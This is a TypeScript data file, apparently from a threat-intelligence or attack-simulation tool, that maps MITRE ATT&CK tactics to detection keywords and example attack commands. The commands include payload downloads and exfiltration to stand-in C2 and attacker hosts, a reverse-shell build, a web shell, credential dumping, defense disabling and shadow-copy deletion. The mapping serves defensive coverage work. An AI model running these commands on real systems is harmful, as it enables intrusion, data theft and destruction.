import type { ReportListItem } from "./types";

export interface MitreSubTechnique {
  id: string;
  name: string;
  description?: string;
  commandSnippet?: string;
}

export interface MitreTechnique {
  id: string;
  name: string;
  tacticId: string;
  tacticName: string;
  description: string;
  subTechniques?: MitreSubTechnique[];
  simulationCommands: string[];
  detectionKeywords: string[];
}

export interface MitreTactic {
  id: string;
  name: string;
  shortName: string;
  description: string;
  order: number;
  techniques: MitreTechnique[];
}

export interface MappedTechnique extends MitreTechnique {
  mappedReports: ReportListItem[];
  coverageCount: number;
  avgSimulationScore: number;
  hasNovelTtp: boolean;
  hasSimulationCommands: boolean;
}

export interface MappedTactic extends Omit<MitreTactic, "techniques"> {
  techniques: MappedTechnique[];
  totalTechniques: number;
  coveredTechniques: number;
  coveragePercentage: number;
  totalMappedReports: number;
}

export const MITRE_TACTICS_DATA: MitreTactic[] = [
  {
    id: "TA0043",
    name: "Reconnaissance",
    shortName: "Recon",
    description: "Gathering information to plan future adversary operations.",
    order: 1,
    techniques: [
      {
        id: "T1595",
        name: "Active Scanning",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries execute active reconnaissance to scan victim infrastructure.",
        simulationCommands: ["nmap -sS -p 80,443,8080,8443 target.org", "masscan -p1-65535 192.168.1.0/24 --rate=1000"],
        detectionKeywords: ["nmap", "port scan", "masscan", "active scanning", "banner grabbing"],
      },
      {
        id: "T1592",
        name: "Gather Victim Host Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries gather host details like OS version, hardware, and configurations.",
        simulationCommands: ["curl -I https://victim.com", "whatweb https://victim.com"],
        detectionKeywords: ["host info", "server header", "fingerprint host", "software version discovery"],
      },
      {
        id: "T1589",
        name: "Gather Victim Identity Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries collect employee names, emails, and credentials from public sources.",
        simulationCommands: ["theHarvester -d target.com -b google", "holehe user@target.com"],
        detectionKeywords: ["employee list", "osint identity", "email harvest", "linkedin reconnaissance"],
      },
      {
        id: "T1590",
        name: "Gather Victim Network Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries collect IP ranges, domain names, and network topology.",
        simulationCommands: ["whois victim.com", "dnsrecon -d victim.com -t std"],
        detectionKeywords: ["whois", "asn lookup", "bgp prefix", "subdomain enumeration", "dnsrecon"],
      },
      {
        id: "T1598",
        name: "Phishing for Information",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries send deceptive communications to elicit sensitive information.",
        simulationCommands: ["sendmail -f spoofed@trusted.org -t victim@target.com"],
        detectionKeywords: ["spearphishing recon", "pretexting", "phishing for info", "credential harvesting page"],
      },
      {
        id: "T1596",
        name: "Search Open Technical Databases",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries query public registries such as certificate transparency and Shodan.",
        simulationCommands: ["curl -s 'https://crt.sh/?q=%.victim.com&output=json'", "shodan search 'ssl:victim.com'"],
        detectionKeywords: ["shodan", "censys", "crt.sh", "certificate transparency", "zoomeye"],
      },
      {
        id: "T1593",
        name: "Search Open Websites/Domains",
        tacticId: "TA0043",
        tacticName: "Reconnaissance",
        description: "Adversaries leverage search engines and open websites to identify targets.",
        simulationCommands: ["google-dorks site:victim.com ext:pdf OR ext:docx"],
        detectionKeywords: ["google dork", "github dork", "pastebin leak", "open web research"],
      },
    ],
  },
  {
    id: "TA0042",
    name: "Resource Development",
    shortName: "Resource Dev",
    description: "Establishing resources to support operations (infrastructure, payloads, accounts).",
    order: 2,
    techniques: [
      {
        id: "T1583",
        name: "Acquire Infrastructure",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries register domains, acquire virtual servers, or purchase DNS services.",
        simulationCommands: ["aws ec2 run-instances --image-id ami-xxxx --instance-type t3.micro"],
        detectionKeywords: ["vps purchase", "domain registration", "bulletproof host", "c2 infrastructure staging"],
      },
      {
        id: "T1584",
        name: "Compromise Infrastructure",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries compromise third-party websites or DNS records to stage attacks.",
        simulationCommands: ["ssh -i compromised_key user@hijacked-vps.com"],
        detectionKeywords: ["hijacked domain", "compromised website", "seo poisoning staging", "hijacked vps"],
      },
      {
        id: "T1587",
        name: "Develop Capabilities",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries build custom malware, obfuscators, and digital code-signing certs.",
        simulationCommands: ["msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=c2.com LPORT=443 -f exe"],
        detectionKeywords: ["custom loader", "crypter development", "payload builder", "custom exploit development"],
      },
      {
        id: "T1588",
        name: "Obtain Capabilities",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries buy or download malware, commercial frameworks (Cobalt Strike), or exploits.",
        simulationCommands: ["git clone https://github.com/adversary-tools/offensive-poc.git"],
        detectionKeywords: ["cobalt strike", "brute ratel", "sliver", "metasploit", "underground marketplace"],
      },
      {
        id: "T1585",
        name: "Establish Accounts",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries create social media, cloud, or email accounts to conduct operations.",
        simulationCommands: ["gh auth login --with-token < fake_token"],
        detectionKeywords: ["sock puppet account", "burner email", "cloud account creation"],
      },
      {
        id: "T1608",
        name: "Stage Capabilities",
        tacticId: "TA0042",
        tacticName: "Resource Development",
        description: "Adversaries upload payloads to public CDNs, Discord, GitHub, or file hosts.",
        simulationCommands: ["curl -T payload.bin https://transfer.sh/stage1.bin"],
        detectionKeywords: ["discord cdn", "github payload host", "pastebin staging", "mega payload host"],
      },
    ],
  },
  {
    id: "TA0001",
    name: "Initial Access",
    shortName: "Initial Access",
    description: "Techniques adversaries use to enter an enterprise network.",
    order: 3,
    techniques: [
      {
        id: "T1190",
        name: "Exploit Public-Facing Application",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Exploiting software vulnerabilities in internet-accessible servers (VPN, Exchange, MOVEit).",
        simulationCommands: [
          "python3 exploit.py -u https://target-vpn.com/api/v1/session -p payload.sh",
          "curl -X POST https://target.com/web-endpoint -d 'cmd=id'",
        ],
        detectionKeywords: ["cve-202", "public-facing", "remote code execution", "vpn exploit", "moveit", "screenconnect"],
      },
      {
        id: "T1566",
        name: "Phishing",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Sending malicious attachments, links, or ISO archives to trick end users.",
        simulationCommands: [
          "python3 send_spearphish.py --target employee@org.com --attachment Invoice.iso",
        ],
        detectionKeywords: ["phishing attachment", "iso archive", "macro", "malicious link", "qr code phishing", "quishing"],
      },
      {
        id: "T1133",
        name: "External Remote Services",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Adversaries leverage exposed remote gateways (RDP, Citrix, SSH, VPN).",
        simulationCommands: ["xfreerdp /u:Administrator /p:Pass123 /v:victim-gateway.org"],
        detectionKeywords: ["rdp initial access", "exposed rdp", "citrix gateway", "vpn login", "external remote services"],
      },
      {
        id: "T1078",
        name: "Valid Accounts",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Using legitimate stolen credentials to log into target VPNs, cloud portals, or portals.",
        simulationCommands: ["openvpn --config corporate.ovpn --auth-user-pass stolen_creds.txt"],
        detectionKeywords: ["stolen credentials", "valid accounts", "credential reuse", "compromised vpn account"],
      },
      {
        id: "T1195",
        name: "Supply Chain Compromise",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Manipulating upstream code, dependencies, or hardware before it reaches the customer.",
        simulationCommands: ["npm publish compromised-package@1.0.1"],
        detectionKeywords: ["supply chain", "malicious npm", "typosquatting", "upstream compromise", "trojanized dependency"],
      },
      {
        id: "T1189",
        name: "Drive-by Compromise",
        tacticId: "TA0001",
        tacticName: "Initial Access",
        description: "Gaining access when a user visits a legitimate website that has been compromised with exploit kits.",
        simulationCommands: ["python3 seo_poisoning_redirect.py --target victim.org"],
        detectionKeywords: ["drive-by", "water hole", "seo poisoning", "malvertising", "fake update browser"],
      },
    ],
  },
  {
    id: "TA0002",
    name: "Execution",
    shortName: "Execution",
    description: "Techniques that result in adversary-controlled code running on a local or remote system.",
    order: 4,
    techniques: [
      {
        id: "T1059",
        name: "Command and Scripting Interpreter",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Executing commands and scripts via PowerShell, Windows Command Shell (cmd), Python, Bash, or VBScript.",
        simulationCommands: [
          "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgA...",
          "cmd.exe /c start /B certutil.exe -urlcache -split -f http://c2.com/payload.exe",
        ],
        detectionKeywords: ["powershell", "cmd.exe", "wscript", "cscript", "bash -c", "encodedcommand", "command interpreter"],
      },
      {
        id: "T1047",
        name: "Windows Management Instrumentation",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Using WMI to execute malicious processes locally or across internal hosts.",
        simulationCommands: [
          "wmic process call create 'powershell.exe -enc SQBFAFgA...'",
          "wmic /node:192.168.1.100 process call create 'cmd.exe /c whoami'",
        ],
        detectionKeywords: ["wmic process", "wmi execution", "win32_process", "wmic /node"],
      },
      {
        id: "T1053",
        name: "Scheduled Task/Job",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Using the OS task scheduler to trigger execution at predefined intervals.",
        simulationCommands: [
          "schtasks /create /tn 'SystemHealth' /tr 'C:\\Windows\\Temp\\loader.exe' /sc onlogon /ru SYSTEM",
          "crontab -l; echo '*/10 * * * * /tmp/.stage2' | crontab -",
        ],
        detectionKeywords: ["schtasks", "at.exe", "cron", "scheduled task", "systemd timer"],
      },
      {
        id: "T1204",
        name: "User Execution",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Relying on target user action such as opening a malicious shortcut, ISO, or macro.",
        simulationCommands: ["start C:\\Users\\Public\\Invoice.lnk"],
        detectionKeywords: ["user execution", "malicious link clicked", "macro enabled", "iso mounted", "lnk shortcut"],
      },
      {
        id: "T1569",
        name: "System Services",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Executing payloads by configuring or launching Windows services or systemd units.",
        simulationCommands: ["sc.exe create MalService binPath= 'C:\\Windows\\Temp\\svc.exe' start= auto"],
        detectionKeywords: ["sc.exe create", "system service execution", "service start", "systemctl start"],
      },
      {
        id: "T1106",
        name: "Native API",
        tacticId: "TA0002",
        tacticName: "Execution",
        description: "Invoking native operating system APIs directly to bypass command-line auditing.",
        simulationCommands: ["VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)"],
        detectionKeywords: ["native api", "syscall", "direct syscall", "ntwritevirtualmemory", "virtualallocex"],
      },
    ],
  },
  {
    id: "TA0003",
    name: "Persistence",
    shortName: "Persistence",
    description: "Techniques adversaries use to keep access across restarts, changed credentials, and interrupts.",
    order: 5,
    techniques: [
      {
        id: "T1547",
        name: "Boot or Logon Autostart Execution",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Configuring Registry Run keys or startup folders to achieve execution upon user sign-in.",
        simulationCommands: [
          'reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysUpdate /t REG_SZ /d "C:\\Windows\\Temp\\update.exe" /f',
        ],
        detectionKeywords: ["registry run", "currentversion\\run", "runonce", "startup folder", "autostart"],
      },
      {
        id: "T1543",
        name: "Create or Modify System Process",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Installing persistence as a Windows Service, systemd daemon, or launch daemon.",
        simulationCommands: ["sc.exe config WinDefend binPath= 'C:\\Windows\\Temp\\persistence.exe'"],
        detectionKeywords: ["service persistence", "launch daemon", "systemd service creation", "sc.exe config"],
      },
      {
        id: "T1505",
        name: "Server Software Component (Web Shell)",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Planting a web shell or malicious module into an IIS, Tomcat, or web application directory.",
        simulationCommands: ['echo "<%@ Page Language=\\"Jscript\\" Debug=true%><%eval(Request.Item[\\"cmd\\"]);%>" > web.aspx'],
        detectionKeywords: ["web shell", "webshell", "aspx webshell", "php backdoor", "iis module", "godzilla webshell"],
      },
      {
        id: "T1136",
        name: "Create Account",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Creating a local or domain user account to maintain persistent administrative access.",
        simulationCommands: ["net user /add backdoor_admin P@ssw0rd123! && net localgroup administrators backdoor_admin /add"],
        detectionKeywords: ["net user /add", "create account", "backdoor user", "shadow admin"],
      },
      {
        id: "T1574",
        name: "Hijack Execution Flow (DLL Search Order)",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Planting a malicious DLL into the application directory to execute when a trusted binary starts.",
        simulationCommands: ["copy malicious.dll C:\\Program Files\\TrustedApp\\version.dll"],
        detectionKeywords: ["dll hijacking", "dll side-loading", "search order hijack", "dll sideload"],
      },
      {
        id: "T1098",
        name: "Account Manipulation",
        tacticId: "TA0003",
        tacticName: "Persistence",
        description: "Manipulating credentials, SSH keys, or Entra ID OAuth permissions on existing accounts.",
        simulationCommands: ["echo 'ssh-rsa AAAAB3NzaC...' >> ~/.ssh/authorized_keys"],
        detectionKeywords: ["account manipulation", "authorized_keys", "oauth app grant", "service principal credential"],
      },
    ],
  },
  {
    id: "TA0004",
    name: "Privilege Escalation",
    shortName: "PrivEsc",
    description: "Techniques adversaries use to gain higher-level permissions (SYSTEM, root, Domain Admin).",
    order: 6,
    techniques: [
      {
        id: "T1548",
        name: "Abuse Elevation Control Mechanism (UAC Bypass)",
        tacticId: "TA0004",
        tacticName: "Privilege Escalation",
        description: "Bypassing Windows User Account Control (UAC) to run processes with high integrity.",
        simulationCommands: [
          'reg.exe add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /f',
          "fodhelper.exe",
        ],
        detectionKeywords: ["uac bypass", "fodhelper", "sdclt", "eventvwr bypass", "elevation control mechanism"],
      },
      {
        id: "T1055",
        name: "Process Injection",
        tacticId: "TA0004",
        tacticName: "Privilege Escalation",
        description: "Injecting code into legitimate processes (explorer.exe, svchost.exe) to elevate privileges.",
        simulationCommands: [
          "inject_shellcode.exe --pid 1044 --payload beacon.bin",
        ],
        detectionKeywords: ["process injection", "process hollowing", "early bird apc", "reflective dll", "create remotethread"],
      },
      {
        id: "T1068",
        name: "Exploitation for Privilege Escalation",
        tacticId: "TA0004",
        tacticName: "Privilege Escalation",
        description: "Exploiting local kernel or service vulnerabilities to jump from user to SYSTEM.",
        simulationCommands: ["./dirtypipe /etc/passwd", "win32k_exploit.exe"],
        detectionKeywords: ["kernel exploit", "local privilege escalation", "dirtycow", "dirtypipe", "cve-202"],
      },
      {
        id: "T1134",
        name: "Access Token Manipulation",
        tacticId: "TA0004",
        tacticName: "Privilege Escalation",
        description: "Duplicating or impersonating security tokens of privileged users.",
        simulationCommands: ["incognito.exe list_tokens -u && incognito.exe impersonate_token 'NT AUTHORITY\\SYSTEM'"],
        detectionKeywords: ["token manipulation", "impersonate_token", "duplicate token", "seimpersonateprivilege"],
      },
    ],
  },
  {
    id: "TA0005",
    name: "Defense Evasion",
    shortName: "Defense Evasion",
    description: "Techniques adversaries use to avoid detection throughout their compromise.",
    order: 7,
    techniques: [
      {
        id: "T1562",
        name: "Impair Defenses",
        tacticId: "TA0005",
        tacticName: "Defense Evasion",
        description: "Disabling antivirus, tampering with EDR agents, or removing event logging.",
        simulationCommands: [
          "sc.exe stop WinDefend",
          "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true",
          "fltmc.exe unload sentinel",
        ],
        detectionKeywords: ["disable antivirus", "windefend", "impair defenses", "blind edr", "byovd", "tamper edr"],
      },
      {
        id: "T1070",
        name: "Indicator Removal",
        tacticId: "TA0005",
        tacticName: "Defense Evasion",
        description: "Clearing Windows Event Logs, deleting bash histories, and scrubbing artifacts.",
        simulationCommands: [
          "wevtutil.exe cl Security && wevtutil.exe cl System",
          "history -c && rm -f ~/.bash_history",
        ],
        detectionKeywords: ["wevtutil", "clear event log", "wevtutil cl", "indicator removal", "event log clear"],
      },
      {
        id: "T1027",
        name: "Obfuscated Files or Information",
        tacticId: "TA0005",
        tacticName: "Defense Evasion",
        description: "Encoding commands, using Base64, packing binaries, or encrypting payload strings.",
        simulationCommands: [
          "certutil.exe -decode encoded_stage.txt stage.exe",
          "powershell.exe -enc JABhAD0... [Base64 string]",
        ],
        detectionKeywords: ["base64 encoded", "obfuscation", "xor encryption", "certutil -decode", "packed binary"],
      },
      {
        id: "T1218",
        name: "System Binary Proxy Execution (LOLBAS)",
        tacticId: "TA0005",
        tacticName: "Defense Evasion",
        description: "Executing malicious code using legitimate signed Windows utilities (rundll32, mshta, regsvr32).",
        simulationCommands: [
          "rundll32.exe C:\\Windows\\Temp\\loader.dll,StartRoutine",
          "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://c2.com/test.sct\"\")\"))",
        ],
        detectionKeywords: ["rundll32", "mshta", "regsvr32", "certutil", "bitsadmin", "lolbas"],
      },
      {
        id: "T1553",
        name: "Subvert Trust Controls (BYOVD)",
        tacticId: "TA0005",
        tacticName: "Defense Evasion",
        description: "Abusing signed vulnerable drivers to gain arbitrary kernel write and disable EDR sensors.",
        simulationCommands: [
          "sc.exe create vuln_driver binPath= 'C:\\Windows\\System32\\drivers\\gdrv.sys' type= kernel",
        ],
        detectionKeywords: ["byovd", "vulnerable driver", "kernel callback", "unhooking", "direct syscall", "amsi patch"],
      },
      {
        id: "T1036",
        name: "Masquerading",
        tacticId: "TA0005",
        tacticName: "Defense Evasion",
        description: "Renaming malicious binaries to mimic legitimate system processes (e.g. svch0st.exe, update.exe).",
        simulationCommands: ["copy payload.exe C:\\Windows\\Temp\\svchost.exe"],
        detectionKeywords: ["masquerading", "fake svchost", "spoofed extension", "lookalike filename"],
      },
    ],
  },
  {
    id: "TA0006",
    name: "Credential Access",
    shortName: "Cred Access",
    description: "Techniques for stealing credentials such as passwords, tokens, hashes, and secrets.",
    order: 8,
    techniques: [
      {
        id: "T1003",
        name: "OS Credential Dumping",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Extracting password hashes, Kerberos tickets, or plain text from LSASS, SAM, or NTDS.dit.",
        simulationCommands: [
          "procdump.exe -ma lsass.exe C:\\Users\\Public\\lsass.dmp",
          "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
          "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
        ],
        detectionKeywords: ["lsass", "procdump", "mimikatz", "sam dump", "ntds.dit", "credential dumping"],
      },
      {
        id: "T1110",
        name: "Brute Force (Password Spray)",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Attempting many passwords against one account or one password across many accounts.",
        simulationCommands: ["hydra -L users.txt -p 'Summer2026!' target-rdp rdp"],
        detectionKeywords: ["password spray", "brute force", "failed logon spike", "eventid 4625"],
      },
      {
        id: "T1558",
        name: "Steal or Forge Kerberos Tickets (Kerberoasting)",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Requesting service tickets (TGS) for SPNs and cracking them offline to reveal service passwords.",
        simulationCommands: [
          "Rubeus.exe kerberoast /outfile:hashes.kerberoast",
          "powershell.exe -c Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"}",
        ],
        detectionKeywords: ["kerberoast", "rubeus", "golden ticket", "silver ticket", "tgs request"],
      },
      {
        id: "T1528",
        name: "Steal Application Access Token",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Extracting OAuth tokens, Primary Refresh Tokens (PRT), or Azure session keys.",
        simulationCommands: [
          "python3 roadrecon.py auth --prt-cookie <cookie>",
        ],
        detectionKeywords: ["prt token", "entra id token", "aadrefreshtoken", "cloud token theft", "oauth token"],
      },
      {
        id: "T1555",
        name: "Credentials from Password Stores",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Extracting passwords from Chrome, Edge, Firefox, or Windows Credential Manager.",
        simulationCommands: ["sharpchromekey.exe logins"],
        detectionKeywords: ["chrome passwords", "browser credentials", "vaultcmd", "credential store"],
      },
    ],
  },
  {
    id: "TA0007",
    name: "Discovery",
    shortName: "Discovery",
    description: "Techniques adversaries use to observe their environment and internal network.",
    order: 9,
    techniques: [
      {
        id: "T1087",
        name: "Account Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Enumerating local and domain user accounts, groups, and permissions.",
        simulationCommands: [
          "net user /domain",
          "net group \"Domain Admins\" /domain",
        ],
        detectionKeywords: ["net user", "domain admins", "account discovery", "get-aduser", "adfind"],
      },
      {
        id: "T1082",
        name: "System Information Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Querying OS details, hostname, hardware, architecture, and patch level.",
        simulationCommands: ["systeminfo", "uname -a"],
        detectionKeywords: ["systeminfo", "os version discovery", "hostname discovery"],
      },
      {
        id: "T1016",
        name: "System Network Configuration Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Enumerating IP addresses, routing tables, DNS servers, and network adapters.",
        simulationCommands: ["ipconfig /all", "route print", "arp -a"],
        detectionKeywords: ["ipconfig", "arp -a", "route print", "network configuration discovery"],
      },
      {
        id: "T1482",
        name: "Domain Trust Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Enumerating Active Directory trust relationships to locate paths into parent domains.",
        simulationCommands: ["nltest /domain_trusts", "nltest /dclist:"],
        detectionKeywords: ["nltest", "domain_trusts", "dclist", "domain trust discovery"],
      },
      {
        id: "T1057",
        name: "Process Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Listing currently running processes to detect security software and sandbox environments.",
        simulationCommands: ["tasklist /v", "ps aux"],
        detectionKeywords: ["tasklist", "ps aux", "process discovery", "get-process"],
      },
      {
        id: "T1033",
        name: "System Owner/User Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Checking current user context, privileges, and token groups.",
        simulationCommands: ["whoami /all", "id"],
        detectionKeywords: ["whoami", "whoami /priv", "whoami /all", "current user context"],
      },
    ],
  },
  {
    id: "TA0008",
    name: "Lateral Movement",
    shortName: "Lateral Move",
    description: "Techniques adversaries use to extend their reach through a network.",
    order: 10,
    techniques: [
      {
        id: "T1021",
        name: "Remote Services (RDP & SMB)",
        tacticId: "TA0008",
        tacticName: "Lateral Movement",
        description: "Using Remote Desktop Protocol (RDP), SMB administrative shares, or SSH to pivot.",
        simulationCommands: [
          "psexec.exe \\\\192.168.1.50 -u DOMAIN\\admin -p P@ss cmd.exe",
          "mstsc.exe /v:192.168.1.50",
        ],
        detectionKeywords: ["psexec", "smb share", "admin$", "c$", "remote desktop", "rdp lateral"],
      },
      {
        id: "T1570",
        name: "Lateral Tool Transfer",
        tacticId: "TA0008",
        tacticName: "Lateral Movement",
        description: "Transferring tools and payloads between internal systems across network shares.",
        simulationCommands: ["copy C:\\Windows\\Temp\\loader.exe \\\\192.168.1.50\\C$\\Windows\\Temp\\"],
        detectionKeywords: ["lateral tool transfer", "copy to c$", "internal file copy", "stage payload internally"],
      },
      {
        id: "T1550",
        name: "Use Alternate Authentication Material (Pass the Hash)",
        tacticId: "TA0008",
        tacticName: "Lateral Movement",
        description: "Authenticating using NTLM hashes or Kerberos tickets without cracking the password.",
        simulationCommands: ["mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:CORP /ntlm:b4b9b02e6f0...\""],
        detectionKeywords: ["pass the hash", "pth", "overpass the hash", "ntlm hash replay"],
      },
      {
        id: "T1210",
        name: "Exploitation of Remote Services",
        tacticId: "TA0008",
        tacticName: "Lateral Movement",
        description: "Exploiting vulnerabilities like EternalBlue or ZeroLogon to compromise adjacent systems.",
        simulationCommands: ["python3 zerologon_exploit.py DC01 192.168.1.10"],
        detectionKeywords: ["zerologon", "eternalblue", "ms17-010", "cve-2020-1472", "remote exploitation lateral"],
      },
    ],
  },
  {
    id: "TA0009",
    name: "Collection",
    shortName: "Collection",
    description: "Techniques adversaries use to gather data of interest (emails, files, database records).",
    order: 11,
    techniques: [
      {
        id: "T1560",
        name: "Archive Collected Data",
        tacticId: "TA0009",
        tacticName: "Collection",
        description: "Compressing and encrypting sensitive files with 7-Zip, WinRAR, or tar prior to exfiltration.",
        simulationCommands: [
          '7z.exe a -p"Password123!" -mhe=on C:\\Windows\\Temp\\exfil.7z C:\\Users\\*\\Documents\\*.xlsx',
        ],
        detectionKeywords: ["7z.exe", "winrar", "rar.exe", "archive data", "password-protected zip", "tar.gz"],
      },
      {
        id: "T1005",
        name: "Data from Local System",
        tacticId: "TA0009",
        tacticName: "Collection",
        description: "Searching local disk drives for files containing financial records, passwords, or customer data.",
        simulationCommands: ["dir /s /b C:\\Users\\*.docx, C:\\Users\\*.pdf, C:\\Users\\*.kdbx"],
        detectionKeywords: ["data collection", "local files", "stolen documents", "harvest documents"],
      },
      {
        id: "T1039",
        name: "Data from Network Shared Drive",
        tacticId: "TA0009",
        tacticName: "Collection",
        description: "Harvesting sensitive files from enterprise network shares and file servers.",
        simulationCommands: ["robocopy \\\\fileserver\\finance C:\\Staging *.pdf /s"],
        detectionKeywords: ["network share collection", "shared drive", "robocopy exfil", "file server harvest"],
      },
      {
        id: "T1114",
        name: "Email Collection",
        tacticId: "TA0009",
        tacticName: "Collection",
        description: "Accessing email accounts or PST/OST database files to extract executive messages.",
        simulationCommands: ["Export-Mailbox -Identity victim@corp.com -PSTFilePath C:\\temp\\victim.pst"],
        detectionKeywords: ["email collection", "mailbox export", "pst file", "exchange collection"],
      },
    ],
  },
  {
    id: "TA0011",
    name: "Command and Control",
    shortName: "C2",
    description: "Techniques adversaries use to communicate with systems under their control.",
    order: 12,
    techniques: [
      {
        id: "T1071",
        name: "Application Layer Protocol",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Communicating over HTTP, HTTPS, DNS, or WebSockets to blend with regular network traffic.",
        simulationCommands: [
          "curl -k -H 'User-Agent: Mozilla/5.0' https://185.220.101.5:8443/beacon",
        ],
        detectionKeywords: ["c2 beacon", "https beacon", "c2 communication", "dns tunneling", "c2 traffic"],
      },
      {
        id: "T1105",
        name: "Ingress Tool Transfer",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Downloading secondary tools, loaders, and ransomware payloads from external servers.",
        simulationCommands: [
          "certutil.exe -urlcache -split -f http://c2-stage.com/ransom.exe C:\\Windows\\Temp\\ransom.exe",
          "curl -s http://c2.com/stage.sh | bash",
        ],
        detectionKeywords: ["certutil -urlcache", "curl download", "ingress tool transfer", "download payload"],
      },
      {
        id: "T1572",
        name: "Protocol Tunneling",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Tunneling network traffic through an existing protocol using Chisel, Ngrok, or SSH.",
        simulationCommands: ["chisel client https://tunnel.c2.com:443 R:8080:127.0.0.1:80"],
        detectionKeywords: ["chisel", "ngrok", "reverse proxy", "protocol tunneling", "ssh tunnel"],
      },
      {
        id: "T1219",
        name: "Remote Access Software",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Deploying legitimate commercial software (AnyDesk, TeamViewer, Quick Assist, ScreenConnect).",
        simulationCommands: ["AnyDesk.exe --install C:\\Program Files\\AnyDesk --start-with-win"],
        detectionKeywords: ["anydesk", "teamviewer", "screenconnect", "quick assist", "remote monitoring"],
      },
      {
        id: "T1573",
        name: "Encrypted Channel",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Employing custom encryption routines or mutual TLS to obfuscate C2 command traffic.",
        simulationCommands: ["openssl s_client -connect c2.adversary.org:443"],
        detectionKeywords: ["encrypted channel", "rc4 rolling key", "mutual tls", "custom c2 encryption"],
      },
    ],
  },
  {
    id: "TA0010",
    name: "Exfiltration",
    shortName: "Exfil",
    description: "Techniques adversaries use to steal data from the target network.",
    order: 13,
    techniques: [
      {
        id: "T1567",
        name: "Exfiltration Over Web Service (Cloud Storage)",
        tacticId: "TA0010",
        tacticName: "Exfiltration",
        description: "Exfiltrating stolen data using Rclone or APIs to Mega, Dropbox, Google Drive, or AWS S3.",
        simulationCommands: [
          "rclone.exe copy C:\\Windows\\Temp\\exfil.7z mega:stolen_data --transfers=4",
        ],
        detectionKeywords: ["rclone", "mega.nz", "dropbox exfil", "s3 exfiltration", "exfiltration cloud"],
      },
      {
        id: "T1041",
        name: "Exfiltration Over C2 Channel",
        tacticId: "TA0010",
        tacticName: "Exfiltration",
        description: "Transmitting collected data directly through established command and control channels.",
        simulationCommands: ["post_c2_data.exe --file exfil.7z --chunk-size 102400"],
        detectionKeywords: ["exfiltration over c2", "outbound exfil", "c2 exfiltration"],
      },
      {
        id: "T1048",
        name: "Exfiltration Over Alternative Protocol",
        tacticId: "TA0010",
        tacticName: "Exfiltration",
        description: "Exfiltrating data over non-standard protocols like raw TCP/UDP, ICMP, or FTP.",
        simulationCommands: ["curl -T stolen.zip ftp://attacker-ftp.com/inbox/"],
        detectionKeywords: ["exfiltration alternative protocol", "dns exfiltration", "ftp exfiltration"],
      },
    ],
  },
  {
    id: "TA0040",
    name: "Impact",
    shortName: "Impact",
    description: "Techniques adversaries use to disrupt availability or compromise integrity.",
    order: 14,
    techniques: [
      {
        id: "T1486",
        name: "Data Encrypted for Impact (Ransomware)",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Encrypting file data to disrupt system availability and extort ransom payments.",
        simulationCommands: [
          "akira.exe -n -s C:\\Users\\Public",
          "blackbasta.exe --path C:\\Data",
        ],
        detectionKeywords: ["ransomware", "encrypt files", "data encrypted for impact", "ransom note", "akira", "lockbit", "black basta"],
      },
      {
        id: "T1490",
        name: "Inhibit System Recovery",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Deleting volume shadow copies, disabling startup recovery, and clearing backup catalogs.",
        simulationCommands: [
          "vssadmin.exe delete shadows /all /quiet",
          "bcdedit.exe /set {default} recoveryenabled No",
